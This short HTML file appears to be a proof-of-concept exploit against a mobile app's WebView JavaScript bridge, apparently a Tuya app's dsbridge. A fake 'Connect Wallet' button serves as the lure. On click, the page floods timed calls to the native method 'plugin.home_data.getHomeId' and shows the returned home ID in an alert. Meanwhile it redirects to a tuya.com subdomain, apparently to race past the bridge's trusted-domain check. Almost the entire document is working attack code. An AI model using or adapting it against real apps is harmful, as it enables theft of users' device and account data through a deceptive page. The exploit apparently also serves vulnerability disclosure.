
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Spoof Relay - poc2: 200</title>
    </head>
    <body>
        <h2>Connecting Wallet…</h2>
        <p id="msg">Please click the button to connect.</p>
        <button id="connectBtn">Connect Wallet</button>
        <script>
            document
                .getElementById("connectBtn")
                .addEventListener("click", async () => {
                  (function() {
    for (let i = 1; i < 4000; i++) {
        setTimeout(function() {
            // 检查方法是否存在
            if (_dsbridge.call("_dsb.hasNativeMethod",JSON.stringify({data:{name:"plugin.home_data.getHomeId", type:"all"}})).indexOf("true") > -1) {
                // 调用JSB方法
                alert(_dsbridge.call("plugin.home_data.getHomeId",JSON.stringify({data:""})));
            }
        }, i);
    }
    window.location = "https://b1234.tuya.com";
})()

                  
                });
        </script>
    </body>
</html>
